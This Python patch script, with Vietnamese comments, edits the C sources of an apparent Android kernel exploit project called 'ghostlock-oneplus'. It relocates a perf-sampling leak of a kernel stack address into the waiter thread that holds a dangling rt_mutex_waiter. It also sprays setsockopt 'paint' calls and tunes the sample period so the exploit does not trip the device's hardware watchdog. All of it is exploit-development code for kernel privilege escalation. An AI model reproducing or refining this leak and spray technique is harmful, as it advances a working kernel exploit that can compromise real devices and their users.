#!/usr/bin/env python3
"""patch_leak_in_T.py

Lỗi: leak (piggyback) chạy trong prepare_perf_fake_page -> thread MAIN, nên
`best` là stack của MAIN, không phải của T (luồng waiter giữ waiter trên stack).
Route thì chạy TRONG T (main.c:166 trong waiter_thread) => phải leak Ở ĐÓ.

Nhưng burst nặng (16×400 paint) đã trip watchdog (sec_debug_hw_reset, dump 76).
=> leak trong route với burst NHẸ: sample_period = 20000 (20 kHz, dưới rate-limit
~80 kHz) + 400 lần paint (~vài ms) => vài chục sample là đủ (mask rule nhận MỌI
sample kernel của T).  Vẫn có env LEAK_PERIOD để chỉnh.
"""
U = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
u = open(U).read()

# (a) bỏ vote piggyback trong leak_page_via_perf
old = """        if (abi == 2) {
          /* waiter = (SP & ~0x3fff) | 0x3d10  (hằng số đo từ 5 panic;
           * xem BAN_GIAO §17.2).  Gộp vào burst này để KHÔNG thêm tải perf. */
          uint64_t w0 = (regs[31] & ~0x3fffULL) | (wl_lo_mask & 0x3fffULL);
          if ((w0 >> 32) == 0xffffff80ULL) {
            int k = -1;
            for (int t = 0; t < wl_nc; t++) if (wl_cand[t] == w0) { k = t; break; }
            if (k >= 0) wl_cnt[k]++;
            else if (wl_nc < 16) { wl_cand[wl_nc] = w0; wl_cnt[wl_nc] = 1; wl_nc++; }
            wl_insock++;
          }
          wl_lo_hist[(regs[31] & 0x3fffULL) & 0xff]++;
        }
"""
assert u.count(old) == 1, ("piggyback vote", u.count(old))
u = u.replace(old, "", 1)

# (b) bỏ publish trong leak_page_via_perf
old = """  {   /* publish the waiter candidate leaked above (see BAN_GIAO §17) */
    uint64_t best = 0; int bestn = 0;
    for (int t = 0; t < wl_nc; t++)
      if (wl_cnt[t] > bestn) { bestn = wl_cnt[t]; best = wl_cand[t]; }
    if (best && bestn >= 2) ssopt_leaked_waiter = best;
    pr_info("waiter leak (piggyback): accepted=%d cands=%d best=%016zx x%d\\n",
            wl_insock, wl_nc, (uintptr_t)best, bestn);
    for (int r = 0; r < 3; r++) {
      uint64_t bv = 0; int bi = -1;
      for (int t = 0; t < 256; t++) if (wl_lo_hist[t] > bv) { bv = wl_lo_hist[t]; bi = t; }
      if (bi < 0 || bv == 0) break;
      pr_info("  sp&0x3fff hist[%d] = %d\\n", bi, (int)bv);
      wl_lo_hist[bi] = 0;
    }
    fsync(1);
  }
"""
assert u.count(old) == 1, ("publish", u.count(old))
u = u.replace(old, "", 1)

# (c) sample_period nhẹ + env LEAK_PERIOD — CHỈ cho ssopt_perf_begin (không đụng
#     leak_page_via_perf, vốn cũng có dòng giống vậy)
i = u.index("int ssopt_perf_begin(void) {")
j = u.index("pe.sample_period = 200;", i)
old = "pe.sample_period = 200;"
new = ("/* keep well under kernel.perf_event_max_sample_rate (~80 kHz) so the burst\n"
       "   * never trips the hardware watchdog (see BAN_GIAO §18.2). */\n"
       "  pe.sample_period = (uint64_t)env_int_range(\"LEAK_PERIOD\", 20000, 200, 1000000);")
u = u[:j] + new + u[j + len(old):]
open(U, "w").write(u)
print("util.c: piggyback removed; sampler period %d default 20000")

F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()
old = """    ssopt_set_waiter_lo();
    /* The waiter is leaked by prepare_perf_fake_page()'s own perf burst
     * (leak_page_via_perf) -- doing a second burst here tripped the hardware
     * watchdog (sec_debug_hw_reset, dump 76), so we only read the global. */
    pr_info("ssopt waiter = %016zx (perf leak, piggybacked)\\n",
            (uintptr_t)ssopt_leaked_waiter);
    fsync(1);"""
new = """    /* Leak T's OWN kernel stack here: this route runs inside the waiter thread
     * (main.c waiter_thread), which is the thread whose stack holds the dangling
     * rt_mutex_waiter.  (Doing it in prepare_perf_fake_page leaked the MAIN
     * thread's stack instead -> bogus waiter -> corrupt-tree walk -> soft lockup.)
     * The burst is light (period 20 kHz + 400 paints) so it cannot trip the
     * hardware watchdog. */
    ssopt_set_waiter_lo();
    ssopt_leaked_waiter = 0;
    if (ssopt_perf_begin() == 0) {
      static unsigned char dummy[0x100];
      memset(dummy, 0, sizeof dummy);
      for (int i = 0; i < 400; i++)
        setsockopt(sock_paint_fd, SOL_SOCKET, 1000, dummy, 0x60);
      ssopt_perf_drain();
      ssopt_leaked_waiter = ssopt_perf_result();
      ssopt_perf_close();
    }
    pr_info("ssopt waiter = %016zx (leak in T)\\n",
            (uintptr_t)ssopt_leaked_waiter);
    fsync(1);"""
assert s.count(old) == 1, ("fops leak", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: light in-route (in-T) leak")
